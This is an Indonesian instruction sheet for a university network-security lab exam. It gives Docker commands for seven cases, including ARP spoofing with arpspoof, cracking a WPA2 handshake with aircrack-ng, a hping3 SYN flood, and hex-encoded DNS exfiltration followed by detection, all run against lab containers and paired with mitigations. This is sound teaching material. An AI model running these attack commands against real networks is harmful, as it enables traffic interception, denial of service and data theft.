# Command per Kasus — tinggal copy-paste, lalu SS bagian yang ditandai

**NIM 24552011027 → 29 mod 10 = 9 → Kasus 9 (k9)**

## Aturan main

- Shell kamu **fish**. Dua pilihan, pilih SATU:
  - **(A) Pakai skrip** (paling gampang, otomatis jalan di bash):
    `./lab/uts-run.sh <nomor>`
  - **(B) Ketik manual:** dulu ketik `bash` di prompt, baru paste command
    (karena `VAR=$(cmd)` itu sintaks bash, fish menolaknya)
- Folder kerja:
  ```
  cd "/home/purwa/Documents/perkuliahan/keamanan jaringan/network-attack-lab-"
  ```
- SS bagian yang ditandai **`>>> SS:`**, simpan dengan **nama file persis**
  seperti yang tertulis.
- Setelah tiap kasus selesai, bereskan dulu sebelum kasus berikutnya:
  ```
  ./lab/uts-run.sh clean
  ```

---

## Kasus 1 — Docker & volume (Pertemuan 1)

**SS:** `docs/evidence/01-docker-volume/01-volume-survives.png`
— baris `24552011027` yang muncul **setelah** `docker rm w-k9`

**SS:** `docs/evidence/01-docker-volume/02-attacker-to-target.png`
— output `<h1>Welcome to nginx!</h1>`

```bash
docker volume create vol-k9
docker run --name w-k9 -v vol-k9:/data alpine:3.20 sh -c 'echo 24552011027 > /data/laporan-k9.txt'
echo ">>> hapus container w-k9"
docker rm w-k9
echo ">>> baca lewat container BARU (data harus masih ada)"
docker run --rm -v vol-k9:/data alpine:3.20 cat /data/laporan-k9.txt   # >>> SS: 01-volume-survives.png
echo ">>> attacker -> target"
docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml up -d
docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target   # >>> SS: 02-attacker-to-target.png
docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml down -v
```

**Yang harus kelihatan:** angka `24552011027` muncul setelah container
dihapus (bukti data ikut volume), dan `Welcome to nginx!`.

---

## Kasus 2 — Kriptografi (Pertemuan 2)

**SS:** `docs/evidence/02-cryptography/01-aes-roundtrip.png`
— dua baris hash yang **SAMA**

**SS:** `docs/evidence/02-cryptography/02-certificate.png`
— `subject=CN=k9.uts.local`, `issuer=CN=k9.uts.local`, `notAfter`

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  echo isi laporan k9 > laporan-k9.txt
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026
  echo "--- hash plaintext ---"; sha256sum laporan-k9.txt     # >>> SS: 01-aes-roundtrip.png
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026
  echo "--- hash hasil dekripsi (HARUS SAMA) ---"; sha256sum hasil-k9.txt
'
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem \
    -days 30 -subj /CN=k9.uts.local
  openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'   # >>> SS: 02-certificate.png
```

**Yang harus kelihatan:** kedua hash identik (sama persis), lalu
`subject=CN=k9.uts.local` dan `issuer=CN=k9.uts.local` (self-signed).

---

## Kasus 3 — ARP spoofing (Pertemuan 3)

**SS (tiga gambar, lebih kuat dari satu):**

| File | Isi |
|---|---|
| `docs/evidence/03-arp-spoofing/00-before.png` | blok `=== 1. SEBELUM` — MAC gateway **benar** + `REACHABLE` |
| `docs/evidence/03-arp-spoofing/01-poisoned.png` | blok `=== 2. SAAT DISERANG` — MAC gateway **berubah** jadi MAC penyerang |
| `docs/evidence/03-arp-spoofing/02-static-arp.png` | blok `=== 3. SETELAH MITIGASI` — MAC gateway kembali benar + `PERMANENT` |

```bash
docker network create lab-arp-k9
docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
sleep 3

# nama network mengandung '-' → Go template Docker menolak {{.a.b-c}},
# jadi WAJIB pakai sintaks index seperti di bawah.
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
MAC_GW=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"

echo "=== 0. samakan titik awal (reset ke MAC gateway asli + ping) ==="
# JANGAN pakai 'ip neigh del' — justru membuat korban menolak ARP reply,
# sehingga langkah 2 selalu gagal. Reset ke MAC asli + ping saja.
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
docker exec korban-k9 ping -c 2 "$IP_GW" >/dev/null 2>&1

echo "=== 1. SEBELUM (baseline) ==="
docker exec korban-k9 ip neigh show "$IP_GW"    # >>> SS: 00-before.png

echo "=== 2. SAAT DISERANG ==="
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null
# polling: poison masuk 1-11 detik, jadi cek tiap detik sampai MAC berubah
for i in $(seq 1 12); do
  sleep 1
  M=$(docker exec korban-k9 ip neigh show "$IP_GW" | sed -n 's/.*lladdr \([0-9a-f:]*\).*/\1/p')
  [ "$M" != "$MAC_GW" ] && break
done
docker exec korban-k9 ip neigh show "$IP_GW"    # >>> SS: 01-poisoned.png
echo "mac gateway asli : $MAC_GW"
echo "mac penyerang    : $(docker exec penyerang-k9 cat /sys/class/net/eth0/address)"

echo "=== 3. SETELAH MITIGASI (static ARP) ==="
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
docker exec korban-k9 ip neigh show "$IP_GW"    # >>> SS: 02-static-arp.png
```

**Yang harus kelihatan:** MAC di kolom `lladdr` **berubah** di langkah 2
(sekarang milik `penyerang-k9`), lalu **kembali benar** + `PERMANENT` di
langkah 3.

---

## Kasus 4 — Handshake WPA2 (Pertemuan 4)

**SS:** `docs/evidence/04-wpa2-handshake/01-aircrack.png`
— baris `KEY FOUND!`

Butuh dua file dari penguji: `handshake-k9.cap` dan `wordlist-k9.txt`
(letakkan di root repo). Kalau belum ada, skip dulu.

```bash
ls -la handshake-k9.cap wordlist-k9.txt
docker run --rm -v "$PWD":/work uts-kali-tools \
  aircrack-ng -w wordlist-k9.txt handshake-k9.cap   # >>> SS: 01-aircrack.png
```

**Yang harus kelihatan:** `KEY FOUND!` beserta passphrase-nya.

---

## Kasus 5 — ICMP dengan Scapy (Pertemuan 5)

> Jalankan **Kasus 3 dulu** (kasus 5 butuh container `korban-k9`).

**SS:** `docs/evidence/05-icmp-scapy/01-icmp-reply.png`
— `TTL balasan: 64` dan `Tipe ICMP balasan: 0`

**SS:** `docs/evidence/05-icmp-scapy/02-subnet-scan.png`
— daftar `Host hidup:` (3 host)

```bash
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
echo "=== 5a. kirim ICMP echo request ==="
docker run --rm --network lab-arp-k9 -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
  python3 /work/kirim_icmp.py "$IP_KORBAN"    # >>> SS: 01-icmp-reply.png

echo "=== 5b. sweep host di network ini ==="
# subnet Docker di sini /16 (65536 alamat) → JANGAN scan seluruh subnet, akan
# menggantung berjam-jam. Ambil IP container yang benar-benar ada saja.
SUBNET=$(docker network inspect lab-arp-k9 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
HOSTS=$(docker network inspect lab-arp-k9 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
        | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
echo "subnet: $SUBNET"
echo "host yang discan: $HOSTS"
docker run --rm --network lab-arp-k9 uts-kali-tools python3 -c "
from scapy.all import ICMP, IP, sr
targets = '$HOSTS'.split(',')
ans, _ = sr(IP(dst=targets)/ICMP(), timeout=3, verbose=False)
print('Host hidup:')
for sent, recv in ans:
    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
"    # >>> SS: 02-subnet-scan.png
```

**Yang harus kelihatan:** `Tipe ICMP balasan: 0` (echo reply) + `TTL 64`,
dan 3 host hidup di sweep.

---

## Kasus 6 — SYN flood (Pertemuan 6)

**SS:** `docs/evidence/06-syn-flood/01-syn-recv.png`
— angka SEBELUM vs SAAT SERANGAN

**SS:** `docs/evidence/06-syn-flood/02-tcpdump-handshake.png`
— `Flags [S]`, `Flags [S.]`, `Flags [.]`

```bash
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml up -d
sleep 3
echo "=== 1. SEBELUM SERANGAN: jumlah SYN_RECV ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV
echo "=== 2. SAAT SERANGAN: jumlah SYN_RECV ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
sleep 5
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV   # >>> SS: 01-syn-recv.png
echo
echo "=== 3. TANGKAP HANDSHAKE (S=SYN, S.=SYN-ACK, .=ACK) ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -T attacker sh -c \
  'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target >/dev/null; sleep 10'   # >>> SS: 02-tcpdump-handshake.png
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml down -v
```

**PENTING soal angka (bahan jawaban terbaikmu):** `SYN_RECV` akan tetap
**sangat kecil** (hasil pengukuran aku: `0` → `5`) padahal hping3 kirim
**~790.000 paket**. Itu **bukan kegagalan** — karena **SYN cookies aktif**
di kernel (`tcp_syncookies=1`), server tidak menyimpan state half-open.

Tulis di laporan: serangan mengirim ~790rb paket, tapi `SYN_RECV` hanya naik
ke 5 karena SYN cookies sudah aktif → serangan berhasil **dimitigasi** kernel.
Lalu jelaskan apa yang terjadi kalau `tcp_syncookies=0` (backlog 512 penuh,
client sah ditolak). Ini menunjukkan kamu paham mekanisme DAN pertahanannya.

---

## Kasus 7 — DNS exfiltration (Pertemuan 7)

**SS:** `docs/evidence/07-dns-exfiltration/01-detect.png`
— `panjang=40` di bawah `Query mencurigakan`

**SS:** `docs/evidence/07-dns-exfiltration/02-decode.png`
— hasil decode `24552011027` dan `rahasia-nilai-uts-k9`

```bash
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml up -d
sleep 4

echo "=== 1. encode jadi hex ==="
NIM=24552011027
HEX=$(echo -n $NIM | xxd -p)
PAYLOAD="rahasia-nilai-uts-k9"
HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
echo "NIM saja : $NIM -> $HEX (panjang $(echo -n $HEX | wc -c))"
echo "payload  : $PAYLOAD -> $HEX_PAYLOAD (panjang $(echo -n $HEX_PAYLOAD | wc -c))"

echo "=== 2. kirim lewat query DNS ==="
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
  dig +short "$HEX.k9.exfil.lab" @dns
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker \
  dig +short "$HEX_PAYLOAD.k9.exfil.lab" @dns

echo "=== 3. log resolver + deteksi ==="
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log    # >>> SS: 01-detect.png

echo "=== 4. decode kembali ==="
echo -n "NIM     : "; echo "$HEX" | xxd -r -p; echo
echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo    # >>> SS: 02-decode.png

docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml down -v
rm -f dns-k9.log
```

**Kenapa dua query?** Hex NIM 11 digit cuma **22 karakter**, sedangkan ambang
detektor **>30** — jadi NIM saja tidak akan terdeteksi. Itu wajar: exfiltration
nyata membawa data besar. Payload kedua (40 karakter) yang kena ambang.

**Bahan jawaban bagus:** satu label DNS maksimal **63 karakter** — hex 83
karakter ditolak `dig` dengan `label too long`. Itu alasan exfiltration nyata
memakai **banyak query berurutan**, dan justru pola itulah yang dideteksi.

---

## Setelah semua selesai

```bash
./lab/uts-run.sh clean
ls -R docs/evidence/
git status --short
```

**Checklist — 14 screenshot:**

- [ ] 01-docker-volume: `01-volume-survives.png`, `02-attacker-to-target.png`
- [ ] 02-cryptography: `01-aes-roundtrip.png`, `02-certificate.png`
- [ ] 03-arp-spoofing: `00-before.png`, `01-poisoned.png`, `02-static-arp.png`
- [ ] 04-wpa2-handshake: `01-aircrack.png`
- [ ] 05-icmp-scapy: `01-icmp-reply.png`, `02-subnet-scan.png`
- [ ] 06-syn-flood: `01-syn-recv.png`, `02-tcpdump-handshake.png`
- [ ] 07-dns-exfiltration: `01-detect.png`, `02-decode.png`
- [ ] Tiap PNG ada transkrip `.txt` pasangannya di `transcripts/`
- [ ] `git status` bersih dari `*.cap`, `*.pem`, `*.enc`, `dns-*.log`